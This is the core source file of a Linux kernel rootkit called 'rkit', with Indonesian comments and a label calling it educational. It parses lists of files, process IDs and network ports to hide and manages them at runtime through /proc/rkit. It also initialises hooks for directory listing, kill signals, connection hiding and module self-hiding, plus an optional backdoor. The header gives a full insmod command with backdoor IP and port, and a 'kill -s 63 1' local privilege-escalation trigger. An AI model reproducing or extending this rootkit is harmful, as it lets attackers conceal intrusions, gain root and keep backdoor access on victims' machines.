/*
 * core.c — inti modul: parameter, daftar tersembunyi, init/exit.
 *
 * Contoh insmod lengkap:
 *   insmod rkit.ko hide="pages.php,rahasia.txt" hidepid="123" \
 *                  hideport="8080,4444" backdoor_ip=10.0.0.5 backdoor_port=4444
 * Atau setelah load:  echo "hide pages.php" > /proc/rkit   (lihat ctl_proc.c)
 * LPE: kill -s 63 1     |     unload: rmmod rkit
 *
 * Fitur opsional (conn-hide, self-hide, backdoor) TIDAK menggagalkan load
 * bila bermasalah — cukup peringatan, agar selalu ada jalan keluar.
 */
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/string.h>
#include <linux/kernel.h>
#include <linux/ctype.h>
#include <linux/slab.h>
#include <linux/errno.h>

#include "compat/kver.h"
#include "rkit.h"

static char *hide;
static char *hidepid;
static char *hideport;      /* csv desimal: "8080,4444" */
module_param(hide,    charp, 0000);
module_param(hidepid, charp, 0000);
module_param(hideport, charp, 0000);

static char g_names[RK_MAX_HIDE][RK_NAME_LEN];
static u32  g_pids[RK_MAX_HIDE];
static u16  g_ports[RK_MAX_PORT];
static int  g_nnames, g_npids, g_nports;

/* ---------- parsing parameter saat init ---------- */
void rk_list_init(const char *names_csv, const char *pids_csv,
		  const char *ports_csv)
{
	char *buf, *tok, *save;

	if (names_csv) {
		buf = kstrdup(names_csv, GFP_KERNEL);
		if (buf) {
			for (tok = strsep(&buf, ","); tok && g_nnames < RK_MAX_HIDE;
			     tok = strsep(&buf, ",")) {
				if (tok[0]) {
					snprintf(g_names[g_nnames], RK_NAME_LEN, "%s", tok);
					g_nnames++;
				}
			}
			kfree(buf);
		}
	}
	if (pids_csv) {
		buf = kstrdup(pids_csv, GFP_KERNEL);
		if (buf) {
			for (tok = strsep(&buf, ","); tok && g_npids < RK_MAX_HIDE;
			     tok = strsep(&buf, ",")) {
				if (tok[0]) {
					g_pids[g_npids] = simple_strtoul(tok, &save, 10);
					if (g_pids[g_npids])
						g_npids++;
				}
			}
			kfree(buf);
		}
	}
	if (ports_csv) {
		buf = kstrdup(ports_csv, GFP_KERNEL);
		if (buf) {
			for (tok = strsep(&buf, ","); tok && g_nports < RK_MAX_PORT;
			     tok = strsep(&buf, ",")) {
				unsigned long p = simple_strtoul(tok, &save, 10);
				if (p && p <= 65535) {
					g_ports[g_nports++] = (u16)p;
				}
			}
			kfree(buf);
		}
	}
	pr_info("rkit: daftar hide = %d nama, %d pid, %d port\n",
		g_nnames, g_npids, g_nports);
}

/* ---------- cek (dipakai hook) ---------- */
bool rk_is_hidden_name(const char *name)
{
	int i;

	if (!name)
		return false;
	for (i = 0; i < g_nnames; i++)
		if (!strcmp(g_names[i], name))
			return true;
	return false;
}

bool rk_is_hidden_pid(const char *entry)
{
	u32 pid;
	int i, len;

	if (!entry || !entry[0] || !isdigit(entry[0]))
		return false;
	len = strnlen(entry, RK_NAME_LEN);
	for (i = 0; i < len; i++)
		if (!isdigit(entry[i]))
			return false;
	pid = simple_strtoul(entry, NULL, 10);
	for (i = 0; i < g_npids; i++)
		if (g_pids[i] == pid)
			return true;
	return false;
}

bool rk_is_hidden_port(u16 port)
{
	int i;

	for (i = 0; i < g_nports; i++)
		if (g_ports[i] == port)
			return true;
	return false;
}

bool rk_any_ports(void)
{
	return g_nports > 0;
}

/* ---------- manipulasi runtime (/proc/rkit) ---------- */
int rk_list_add_name(const char *name)
{
	if (!name || !name[0] || strlen(name) >= RK_NAME_LEN)
		return -EINVAL;
	if (rk_is_hidden_name(name))
		return 0;
	if (g_nnames >= RK_MAX_HIDE)
		return -ENOSPC;
	snprintf(g_names[g_nnames], RK_NAME_LEN, "%s", name);
	g_nnames++;
	return 0;
}

int rk_list_del_name(const char *name)
{
	int i;

	if (!name || !name[0])
		return -EINVAL;
	for (i = 0; i < g_nnames; i++) {
		if (!strcmp(g_names[i], name)) {
			memmove(&g_names[i], &g_names[i + 1],
				(g_nnames - i - 1) * RK_NAME_LEN);
			g_nnames--;
			return 0;
		}
	}
	return -ENOENT;
}

int rk_list_add_pid(u32 pid)
{
	int i;

	if (!pid)
		return -EINVAL;
	for (i = 0; i < g_npids; i++)
		if (g_pids[i] == pid)
			return 0;
	if (g_npids >= RK_MAX_HIDE)
		return -ENOSPC;
	g_pids[g_npids++] = pid;
	return 0;
}

int rk_list_del_pid(u32 pid)
{
	int i;

	for (i = 0; i < g_npids; i++) {
		if (g_pids[i] == pid) {
			memmove(&g_pids[i], &g_pids[i + 1],
				(g_npids - i - 1) * sizeof(u32));
			g_npids--;
			return 0;
		}
	}
	return -ENOENT;
}

int rk_list_add_port(u16 port)
{
	int i;

	if (!port)
		return -EINVAL;
	for (i = 0; i < g_nports; i++)
		if (g_ports[i] == port)
			return 0;
	if (g_nports >= RK_MAX_PORT)
		return -ENOSPC;
	g_ports[g_nports++] = port;
	return 0;
}

int rk_list_del_port(u16 port)
{
	int i;

	for (i = 0; i < g_nports; i++) {
		if (g_ports[i] == port) {
			memmove(&g_ports[i], &g_ports[i + 1],
				(g_nports - i - 1) * sizeof(u16));
			g_nports--;
			return 0;
		}
	}
	return -ENOENT;
}

int rk_list_status(char *buf, size_t sz)
{
	int i, off = 0;

	off += scnprintf(buf + off, sz - off, "backend: modern_5x_6x\n");
	off += scnprintf(buf + off, sz - off, "hide_names(%d):", g_nnames);
	for (i = 0; i < g_nnames && off < (int)sz - RK_NAME_LEN - 2; i++)
		off += scnprintf(buf + off, sz - off, "%s%s",
				 i ? "," : " ", g_names[i]);
	off += scnprintf(buf + off, sz - off, "\nhide_pids(%d):", g_npids);
	for (i = 0; i < g_npids && off < (int)sz - 16; i++)
		off += scnprintf(buf + off, sz - off, "%s%u",
				 i ? "," : " ", g_pids[i]);
	off += scnprintf(buf + off, sz - off, "\nhide_ports(%d):", g_nports);
	for (i = 0; i < g_nports && off < (int)sz - 8; i++)
		off += scnprintf(buf + off, sz - off, "%s%u",
				 i ? "," : " ", g_ports[i]);
	off += scnprintf(buf + off, sz - off, "\nmod_hide: %s\n",
			 rk_modhide_active() ? "aktif" : "tidak");
	scnprintf(buf + off, sz - off, "backdoor: %s\n",
		  rk_backdoor_status());
	return off;
}

/* ---------- lifecycle ---------- */
static int __init rkit_init(void)
{
	int ret;

	pr_info("rkit: memuat backend modern_5x_6x\n");

	ret = rk_resolver_init();
	if (ret)
		return ret;

	rk_list_init(hide, hidepid, hideport);

	ret = rk_getdents_init();
	if (ret)
		goto err_resolver;

	ret = rk_kill_init();
	if (ret)
		goto err_getdents;

	ret = rk_ctl_init();
	if (ret)
		goto err_kill;

	/* ---- fitur OPSIONAL: gagal = peringatan saja, load tetap jalan ---- */
	if (rk_seq_init())
		pr_warn("rkit: conn-hide tidak aktif (kretprobe seq_show gagal)\n");
	if (rk_modhide_init())
		pr_warn("rkit: self-hide tidak aktif (symbol modules/module_mutex tak ditemukan)\n");
	if (rk_backdoor_init())
		pr_info("rkit: backdoor NONAKTIF — set backdoor_ip=<ip> saat insmod\n");

	pr_info("rkit: siap — uji dulu di VM (docs/TESTING.md)\n");
	return 0;

err_kill:
	rk_kill_exit();
err_getdents:
	rk_getdents_exit();
err_resolver:
	rk_resolver_exit();
	return ret;
}

static void __exit rkit_exit(void)
{
	if (rk_modhide_active())
		rk_modhide_show();   /* pastikan terdaftar lagi sebelum keluar */
	rk_backdoor_exit();
	rk_seq_exit();
	rk_ctl_exit();
	rk_kill_exit();
	rk_getdents_exit();
	rk_resolver_exit();
	pr_info("rkit: dilepas — semua hook dibersihkan\n");
}

module_init(rkit_init);
module_exit(rkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("unified-rootkit (edukasi)");
MODULE_DESCRIPTION("Backend modern_5x_6x: hide file/pid/koneksi + LPE + backdoor opt-in (edukasi)");
MODULE_INFO(vermagic_target, "5.0 - 6.8 x86_64");
